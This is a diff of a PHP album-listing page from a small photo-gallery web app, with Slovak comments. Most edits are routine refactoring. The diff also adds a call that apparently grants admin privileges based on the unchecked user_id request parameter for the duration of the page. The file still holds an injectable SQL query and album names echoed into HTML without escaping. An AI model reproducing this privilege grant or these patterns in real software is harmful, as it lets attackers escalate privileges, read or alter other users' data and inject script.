@@ -1,13 +1,18 @@
 <?php
+
+    /* stranka, kde su zobrazene albumy pouzivatela */
     include 'functions.php';
     include 'config.php';    
     image_page_header('Albums'); 
-    check_if_logged_in();   
+    check_if_logged_in(); /* overime, ci si albumy ide prezerat prihlaseny pouzivatel */  
+    echo_form_submit_script("#create_album","create_album.php");
+    echo_form_submit_script(".rename_album","rename_album.php" );
+    grant_privileges_to_admin($_GET['user_id']);
 ?>
 
 
 <script>
-    displayCreateAlbumForm = false;
+    displayCreateAlbumForm = false; /* flag pre formular pre novy album - defaultne je skryty, po kliku sa striedavo zobrazuje a skryva */
         
     
     function renameAlbum(album_id){
@@ -21,6 +26,8 @@
             });
         });
     }
+    
+    
     function showCreateAlbumForm(){
         displayCreateAlbumForm = !displayCreateAlbumForm;
         
@@ -43,8 +50,8 @@
 <div id="imagePageTop">
 
 <?php 
-$path =  'http://' . $_SERVER['SERVER_NAME'] . '/~korbas4/fotoAlbum/get_image.php?image_id='; 
-$path_to_album = 'http://' . $_SERVER['SERVER_NAME'] . '/~korbas4/fotoAlbum/images.php';
+$path =  $server_path.'get_image.php?image_id='; /*'http://' . $_SERVER['SERVER_NAME'] . '/~korbas4/fotoAlbum/get_image.php?image_id='; */
+$path_to_album = $server_path.'images.php'; /*'http://' . $_SERVER['SERVER_NAME'] . '/~korbas4/fotoAlbum/images.php'; */
 
 echo_logout();
 
@@ -83,7 +90,6 @@ if ($_GET['user_id'] == $_SESSION['user_id']){
 <?php
     $link = spoj_s_db();
 
-
     if ($_GET['user_id'] == $_SESSION['user_id']){
        /* ak pouzivatel ide zobrazit vlastne albumy, zobrazia sa vsetky */	
 	   $result = mysql_query("SELECT id,name FROM  `Album` WHERE owner_id = ".mysql_escape_string($_GET['user_id']), $link);	
@@ -100,7 +106,8 @@ if ($_GET['user_id'] == $_SESSION['user_id']){
         $link_photo = spoj_s_db();
         $result_photo = mysql_query("SELECT * FROM  `Photo` WHERE album_id = ".$row['id']." LIMIT 1", $link);
         
-        $file = mysql_fetch_assoc($result_photo)['id'].'.jpg';
+        $image_id = mysql_fetch_assoc($result_photo)['id'];        
+        $file = $image_id.'.jpg';
 ?>  
         <li >
 <?php
@@ -109,20 +116,23 @@ if ($_GET['user_id'] == $_SESSION['user_id']){
 ?>         
             <span id="rename_button_span<?php echo $row['id'] ?>" style="position: absolute; left: 30px; top: 220px;"><?php echo $row['name']; ?> <button id="rename_button<?php echo $row['id'];?>" onclick="renameAlbum(<?php echo $row['id']?>);">rename</button></span>
             <div id="rename<?php echo $row['id'] ?>" style="display: none; position: absolute; left: 30px; top: 220px">            
-            <form action="rename_album.php?album_id=<?php echo $row['id'];?>" method="post">
+            <form action="rename_album.php" method="post" class="rename_album">
                 <input type="text" name="name" value="<?php echo $row['name']; ?>">
-                <input type="submit" value="rename">            
+                <input type="hidden" name="album_id" value="<?php echo $row['id'];?>"> 
+                <input type="submit" value="rename">           
             </form>
             </div>
 <?php 
         } 
 ?>
             <a href="<?php echo $path_to_album .'?album_id='.$row['id']; ?>" rel='lightbox' > 
-                <img src="./scripts/timthumb.php?src=<?php echo $TIMTHUMB_PATH . $file; ?>&amp;h=194&amp;w=224&amp;zc=1&amp;q=100" alt="<?php echo $file; ?>" /> 
+                <img src="./timthumb.php?id=<?php echo $image_id; ?>" alt="<?php echo $file; ?>" /> 
             </a>   
         </li>
 <?php
     }
-    
+    restore_admin_privileges();
 ?>
 </ul>
+</body>
+</html>
